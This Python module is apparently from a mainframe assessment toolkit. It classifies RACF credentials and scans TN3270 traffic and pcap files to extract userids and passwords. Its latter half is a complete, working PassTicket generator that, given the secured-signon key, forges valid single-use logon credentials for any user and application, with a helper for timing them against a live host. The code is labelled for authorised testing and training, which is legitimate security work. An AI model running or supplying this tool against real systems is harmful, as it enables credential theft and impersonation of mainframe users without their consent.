"""RACF PassTicket parsing / analysis for PHOSPHOR.

A PassTicket is an 8-character, single-use, time-bound credential RACF accepts in place
of a password. It is derived from a secured-signon application key + application name +
userid + a time value (a DES-based algorithm), then encoded to 8 characters. You cannot
reverse one without the key - but on an assessment it is very useful to *recognise* that
a captured logon used a PassTicket rather than a static password, and to pull the
userid / applid / credential out of a captured TN3270 logon.

This module classifies a credential, analyses a PassTicket's structure, and scans a
captured (direction, bytes) stream for candidate logon fields. Alphabet matches GIBSON's
PassTicket service. Authorised testing / GIBSON training only.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

# Same alphabet GIBSON's PassTicketService emits (A-Z0-9).
PT_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
_PT_SET = set(PT_ALPHABET)

# Words that look PassTicket-shaped but are almost certainly a chosen password.
_COMMON = {"PASSWORD", "IBMUSER", "PASSW0RD", "CHANGEME", "LETMEIN1", "TRUSTED1"}


def _ebcdic(data: bytes) -> str:
    try:
        return data.decode("cp037")
    except Exception:
        return "".join(chr(b) if 32 <= b < 127 else " " for b in data)


def looks_like_passticket(s: str) -> bool:
    """Heuristic: exactly 8 chars, all in the PassTicket alphabet, mixed enough that it
    isn't an obvious dictionary password."""
    if not s or len(s) != 8:
        return False
    u = s.upper()
    if any(c not in _PT_SET for c in u):
        return False
    if u in _COMMON:
        return False
    has_alpha = any(c.isalpha() for c in u)
    has_digit = any(c.isdigit() for c in u)
    # PassTickets are effectively random 8-char A-Z0-9; require at least one digit OR
    # a non-word look (no long vowel-consonant runs typical of chosen passwords).
    return has_alpha and (has_digit or len(set(u)) >= 6)


def classify_credential(s: str) -> Tuple[str, str]:
    """Return (kind, reason): 'passticket', 'password', or 'phrase'."""
    if not s:
        return "unknown", "empty"
    if len(s) > 8:
        return "phrase", f"{len(s)} chars - too long for a password/PassTicket (password phrase)"
    if looks_like_passticket(s):
        return "passticket", "8 chars, PassTicket alphabet, high-entropy - likely a PassTicket"
    return "password", "does not match PassTicket shape - likely a static password"


@dataclass
class PassTicketInfo:
    value: str
    kind: str
    reason: str
    length: int
    alphabet_valid: bool
    letters: int
    digits: int
    distinct: int
    notes: List[str] = field(default_factory=list)


def analyse(value: str) -> PassTicketInfo:
    """Structural analysis of one candidate credential."""
    v = (value or "").strip()
    kind, reason = classify_credential(v)
    up = v.upper()
    info = PassTicketInfo(
        value=v, kind=kind, reason=reason, length=len(v),
        alphabet_valid=bool(v) and all(c in _PT_SET for c in up),
        letters=sum(c.isalpha() for c in up),
        digits=sum(c.isdigit() for c in up),
        distinct=len(set(up)),
    )
    if kind == "passticket":
        info.notes.append("Single-use and time-bound (default validity ~10 min); "
                          "cannot be reversed without the secured-signon key.")
        info.notes.append("Replay after use should be rejected; if it is accepted, "
                          "flag GENTIMEOUT / replay protection as a finding.")
        info.notes.append("If you hold the PTKTDATA/SSIGNON key you can mint PassTickets "
                          "for any userid - review who can generate them.")
    return info


# --- pull candidate logon fields out of a captured stream --------------------
_USERID_LABEL = re.compile(r"\b(USERID|USER|LOGON|LOGONID|NAME)\b", re.I)
_PW_LABEL = re.compile(r"\b(PASSWORD|PASSWORD PHRASE|NEW PASSWORD|PASS)\b", re.I)
_TOKEN = re.compile(r"[A-Z0-9#@$]{3,64}")


@dataclass
class LogonField:
    text: str
    kind: str
    reason: str


def scan_capture(packets: List[Tuple[str, bytes]]) -> List[LogonField]:
    """Given the tap's [(direction, bytes)] list, decode EBCDIC and return candidate
    credential tokens with a classification. Outbound (client->host) records carry what
    the user typed, so those are where a password/PassTicket appears."""
    out: List[LogonField] = []
    seen = set()
    for direction, data in packets or []:
        text = _ebcdic(bytes(data))
        # tokens that look like credentials/userids
        for tok in _TOKEN.findall(text.upper()):
            if tok in seen or tok in ("READY", "LOGON", "USERID", "PASSWORD", "TSO", "CICS"):
                continue
            seen.add(tok)
            kind, reason = classify_credential(tok)
            if kind in ("passticket", "password") and 3 <= len(tok) <= 8:
                out.append(LogonField(tok, kind, reason))
    return out


def format_report(fields: List[LogonField]) -> str:
    if not fields:
        return "PassTicket scan: no candidate credentials found in the capture."
    lines = ["PassTicket / credential scan:", "  CANDIDATE   KIND        NOTE"]
    for f in fields[:20]:
        lines.append(f"  {f.text:<10}  {f.kind:<10}  {f.reason}")
    pts = sum(1 for f in fields if f.kind == "passticket")
    lines.append(f"  -- {len(fields)} candidate(s), {pts} PassTicket-shaped --")
    return "\n".join(lines)


# --- read a saved .pcap and scan it (not just the live tap buffer) ----------
def _tcp_payload(frame: bytes):
    """Return (src_port, tcp_payload) from an Ethernet/IPv4/TCP frame, or None."""
    if len(frame) < 34 or frame[12:14] != b"\x08\x00":     # not IPv4-over-Ethernet
        return None
    ihl = (frame[14] & 0x0F) * 4
    ip_end = 14 + ihl
    if len(frame) < ip_end + 20 or frame[23] != 6:         # not TCP
        return None
    thl = (frame[ip_end + 12] >> 4) * 4
    sport = (frame[ip_end] << 8) | frame[ip_end + 1]
    return sport, frame[ip_end + thl:]


def read_pcap_payloads(path: str) -> List[Tuple[str, bytes]]:
    """Extract (direction, payload) records from a pcap written by PHOSPHOR (or any
    Ethernet/IPv4/TCP capture). Direction is inferred from the TCP source port
    (port 23 -> inbound from host)."""
    import struct
    try:
        raw = open(path, "rb").read()
    except Exception:
        return []
    if len(raw) < 24:
        return []
    magic = struct.unpack("<I", raw[:4])[0]
    le = magic == 0xA1B2C3D4
    if not le and magic != 0xD4C3B2A1:
        return []
    fmt = "<IIII" if le else ">IIII"
    i, out = 24, []
    while i + 16 <= len(raw):
        _ts, _us, caplen, _orig = struct.unpack(fmt, raw[i:i + 16]); i += 16
        frame = raw[i:i + caplen]; i += caplen
        tp = _tcp_payload(frame)
        if tp and tp[1]:
            out.append(("IN" if tp[0] == 23 else "OUT", tp[1]))
    return out


def scan_pcap_file(path: str) -> List[LogonField]:
    """Scan a saved capture file for candidate credentials / PassTickets."""
    return scan_capture(read_pcap_payloads(path))


# ============================================================================
#  PassTicket GENERATION  (RACF secured-signon algorithm)
# ============================================================================
# The offensive counterpart to the classifier above: given the secured-signon
# application key (the RACF PTKTDATA / SESSKEY, 16 hex chars = an 8-byte DES key),
# an applid and a userid, produce a valid single-use, time-bound PassTicket that
# RACF will accept in place of that user's password for that application.
#
# This is a faithful port of the published RACF algorithm (IBM SKALGO/ALGOR;
# Andrew VanVleet's research; Soldier of Fortran / bigendiansmalls gen_passticket;
# the chrrel Java reference).  DES-ECB is taken from PHOSPHOR's existing provider so
# there is no extra dependency.  Authorised testing / GIBSON training only.

import time as _time
from typing import Optional as _Optional

try:
    from phosphor.toolchain import racf_des as _rd
except Exception:                       # pragma: no cover
    _rd = None

_PT_TT = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

# bit-permutation tables (1-based) for the six mixing rounds
_PT_PERM = {
    1: [10, 2, 12, 4, 14, 6, 16, 8, 9, 1, 11, 3, 13, 5, 15, 7],
    2: [1, 10, 3, 12, 13, 16, 7, 15, 9, 2, 11, 4, 5, 14, 8, 6],
    3: [3, 10, 1, 12, 13, 16, 9, 15, 7, 2, 14, 4, 5, 11, 8, 6],
    4: [10, 4, 12, 2, 14, 8, 16, 6, 9, 1, 13, 3, 11, 5, 15, 7],
    5: [4, 10, 12, 1, 8, 16, 14, 5, 9, 2, 13, 3, 11, 7, 15, 6],
    6: [1, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2],
}


def _des(key8: bytes, block8: bytes) -> bytes:
    if _rd is None or not _rd.crypto_available():
        raise RuntimeError("no DES provider available for PassTicket generation")
    out = _rd._des_encrypt(key8, block8)
    if out is None:
        raise RuntimeError("DES encryption failed")
    return out


def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def generate_passticket(userid: str, applid: str, key_hex: str,
                        when: _Optional[int] = None) -> str:
    """Return the 8-character PassTicket for (userid, applid) under the secured-signon
    key `key_hex` (16 hex chars) at GMT epoch second `when` (defaults to now).

    PassTickets are valid within a +/-10 minute window of the host clock, so to use a
    generated ticket against a live host the workstation clock must be close to the
    host's GMT time (or pass an explicit `when`)."""
    if when is None:
        when = int(_time.time())
    u = userid.upper()
    a = applid.upper()
    userid_e = (u + " " * (8 - len(u))).encode("cp500")[:8]
    app_e = (a + " " * (8 - len(a))).encode("cp500")[:8]
    sec = bytes.fromhex(key_hex.strip())
    if len(sec) != 8:
        raise ValueError("secured-signon key must be 16 hex characters (8 bytes)")

    r1 = _des(sec, userid_e)                       # Result 1
    r2a = _xor(r1, app_e)                           # Result 2a
    r2 = _des(sec, r2a)                             # Result 2
    r3 = r2[0:4]                                    # Result 3

    hexs = "{0:0X}".format(int(when))
    if len(hexs) % 2:
        hexs = "0" + hexs
    tib = bytes.fromhex(hexs)[-4:].rjust(4, b"\x00")
    r4 = _xor(r3, tib)                              # Result 4

    # Result 5 - six-round mix
    l2b = r4[0:2]
    r2b = r4[2:4]
    upad = u.encode("cp500") + b"\x55" * (12 - len(u))
    pad1, pad2 = upad[0:6], upad[6:12]
    for i in range(1, 7):
        resB = r2b + (pad1 if i % 2 else pad2)
        resC = _des(sec, resB)
        resD = resC[0:2]
        resE = _xor(l2b, resD)
        l2b = r2b
        r2b = resE
        bits = "".join("{0:08b}".format(x) for x in resE)
        perm = _PT_PERM[i]
        newbits = "".join(bits[perm[bb] - 1] for bb in range(16))
        r2b = bytes.fromhex("{0:04X}".format(int(newbits, 2)))
    r5 = l2b + r2b                                  # Result 5

    # Result 6 - map to the 36-char alphabet, 6 bits at a time
    r5b = "".join("{0:08b}".format(x) for x in r5)
    out = ""
    rnum = 27
    for _ in range(8):
        rnum = (rnum + 4) % 32
        bits = "".join(r5b[(rnum + bb - 1) % 32] for bb in range(6))
        out += _PT_TT[int(bits, 2) % 36]
    return out


def passticket_window(userid: str, applid: str, key_hex: str,
                      when: _Optional[int] = None, spread: int = 1) -> list:
    """Generate the PassTickets for the current second +/- `spread` seconds, since the
    exact host second may differ slightly. Returns [(offset, ticket), ...]."""
    if when is None:
        when = int(_time.time())
    return [(off, generate_passticket(userid, applid, key_hex, when + off))
            for off in range(-spread, spread + 1)]
